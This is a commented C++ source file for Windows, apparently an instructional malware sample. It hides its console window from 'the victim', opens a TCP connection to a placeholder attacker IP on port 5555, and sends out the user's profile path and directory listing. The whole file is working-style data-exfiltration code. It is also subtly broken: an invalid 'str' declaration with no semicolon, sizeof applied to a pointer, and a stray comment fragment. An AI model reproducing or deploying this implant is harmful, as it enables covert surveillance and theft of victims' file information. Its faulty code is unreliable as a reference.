// We use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs.
#define _WINSOCK_DEPRECATED_NO_WARNINGS

//We need the Ws2_32.lib library in order to use sockets (networking) functionality in Windows.
#pragma comment(lib, "Ws2_32.lib")

#include <iostream>
#include <winsock2.h> // includes networking utilities
#include <stdio.h> //includes standard input/output utilities (needed for perror())
#include <stdlib.h>
#include <dirent.h>
#include <string>

// v
str targetIP = ""

    // This function gets the value of %USERPROFILE% environment variable.
    //The %USERPROFILE% variable contains the path of the user profile folder we have access to (a.k.a. the victim user)
char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}

// *Definitions*
int main() {
    //Hides program window so that it's not obvious to the victim that this program is running
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData; //This data type (it's a struct) holds information about windows socket implementation.
    SOCKET server; //This data type stores the connection of the SOCKET type.
    SOCKADDR_IN addr; //This data type (it's a struct) holds the details of socket connection.

    WSAStartup(MAKEWORD(2, 0), &WSAData); //Initialize usage of the winsock library (needed for opening a network connection).
    server = socket(AF_INET, SOCK_STREAM, 0); //Set up a TCP socket. AF_INET = IPv4. SOCK_STREAM = TCP socket.

    addr.sin_addr.s_addr = inet_addr(targetIP);
    addr.sin_family = AF_INET; //IPV4 as mentioned above
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr)); //Connect using above variables

    char* pPath = userDirectory(); // Get the user directory using the userDirectory function.
    
    //*Execution*
    
    //Send the user directory path to the attacker. This is followed by a newline so that the output received by the attacker is properly formatted - 1 entry per line.
   
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);
    
    //Opens the user's directory and then reads the entries in it. All the entries are then sent back to the attacker's machine over the established TCP socket. #
   
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name)); //function call and compile and run the program again.
        }
        closedir(dir);
    }
    else {
        // Display the associated error using the call to perror().
        perror("");
    }
    //#
 
    closesocket(server);
    //Clean up the Winsock library components.
    WSACleanup();
}
